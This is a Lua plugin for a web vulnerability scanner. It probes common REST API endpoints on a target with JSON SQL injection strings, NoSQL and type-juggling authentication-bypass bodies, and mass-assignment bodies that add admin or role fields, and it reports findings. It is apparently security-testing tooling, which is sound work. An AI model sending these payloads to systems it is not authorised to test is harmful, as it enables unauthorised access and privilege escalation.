-- json_api_injection.lua
-- Detects SQL injection and other vulnerabilities in JSON/REST API endpoints
-- Many modern apps use JSON APIs that are missed by form-based scanners
--
-- Tests:
--   1. JSON body SQL injection (string fields)
--   2. JSON body type juggling
--   3. Mass assignment detection
--   4. IDOR (Insecure Direct Object Reference) patterns

local base_url = TARGET:match("^(https?://[^/]+)")
if not base_url then return end

-- SQL error patterns
local sql_errors = {
    "you have an error in your sql syntax",
    "unclosed quotation mark",
    "sqlstate",
    "pg_query()",
    "ora-01756",
    "sqlite3.operationalerror",
    "mysql_num_rows",
    "syntax error at or near",
    "microsoft ole db provider",
}

-- Common REST API endpoints to probe
local api_endpoints = {
    "/api/users", "/api/user", "/api/search", "/api/data",
    "/api/v1/users", "/api/v1/search", "/api/v2/users",
    "/api/products", "/api/items", "/api/orders",
    "/graphql", "/api/graphql",
}

-- JSON SQLi payloads (injected into string fields)
local sqli_payloads = {
    {field = "id", value = "1' OR '1'='1"},
    {field = "id", value = "1 UNION SELECT NULL--"},
    {field = "username", value = "admin'--"},
    {field = "search", value = "' OR 1=1--"},
    {field = "email", value = "test@test.com' AND SLEEP(0)--"},
    {field = "query", value = "1'; SELECT pg_sleep(0)--"},
}

-- Type juggling payloads (bypass auth with non-string types)
local type_juggle_payloads = {
    '{"username": true, "password": true}',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    '{"username": null, "password": null}',
    '{"username": 0, "password": 0}',
    '{"username": [], "password": []}',
}

local function check_sql_error(body)
    if not body then return nil end
    local lower = body:lower()
    for _, sig in ipairs(sql_errors) do
        if lower:find(sig, 1, true) then
            return sig
        end
    end
    return nil
end

-- Phase 1: Probe API endpoints for SQL injection via JSON body
for _, endpoint in ipairs(api_endpoints) do
    local url = base_url .. endpoint

    -- Check if endpoint exists
    local check = http.get(url)
    if not check or check.status == 404 then
        goto next_endpoint
    end

    -- Try JSON SQLi payloads
    for _, payload in ipairs(sqli_payloads) do
        local json_body = '{"' .. payload.field .. '": "' .. payload.value .. '"}'
        local resp = http.post_json(url, json_body)
        if resp then
            local err_sig = check_sql_error(resp.body)
            if err_sig then
                report.finding("high", "sqli",
                    "SQL Injection in JSON API (" .. endpoint .. ")",
                    "SQL error '" .. err_sig .. "' triggered via JSON body injection. " ..
                    "Field: " .. payload.field .. ", Payload: " .. payload.value,
                    url)
                goto done  -- one finding per type
            end
        end
    end

    -- Try type juggling for auth bypass
    for _, json_body in ipairs(type_juggle_payloads) do
        local resp = http.post_json(url, json_body)
        if resp and resp.status == 200 then
            local body_lower = (resp.body or ""):lower()
            if body_lower:find("token") or body_lower:find("success") or
               body_lower:find("authenticated") then
                report.finding("high", "custom",
                    "JSON Type Juggling Auth Bypass (" .. endpoint .. ")",
                    "Authentication bypassed by sending non-string types in JSON body. " ..
                    "Payload: " .. json_body, url)
                goto done
            end
        end
    end

    ::next_endpoint::
end
::done::

-- Phase 2: Mass assignment detection
-- Try adding admin/role fields to registration-like endpoints
local mass_assign_endpoints = {
    "/api/register", "/api/signup", "/api/users", "/api/v1/register",
    "/api/user/update", "/api/profile", "/api/settings",
}
local mass_assign_payloads = {
    '{"username":"test","password":"test123","role":"admin"}',
    '{"username":"test","password":"test123","isAdmin":true}',
    '{"username":"test","password":"test123","admin":true,"privilege":"superuser"}',
}

for _, endpoint in ipairs(mass_assign_endpoints) do
    local url = base_url .. endpoint
    for _, json_body in ipairs(mass_assign_payloads) do
        local resp = http.post_json(url, json_body)
        if resp and resp.status >= 200 and resp.status < 400 then
            local body = resp.body or ""
            -- Check if admin/role field was accepted and reflected
            if body:find('"role"%s*:%s*"admin"') or
               body:find('"isAdmin"%s*:%s*true') or
               body:find('"admin"%s*:%s*true') then
                report.finding("high", "custom",
                    "Mass Assignment Vulnerability (" .. endpoint .. ")",
                    "Server accepted and reflected privileged fields (role/admin) in JSON body. " ..
                    "An attacker can escalate privileges.", url)
                return
            end
        end
    end
end
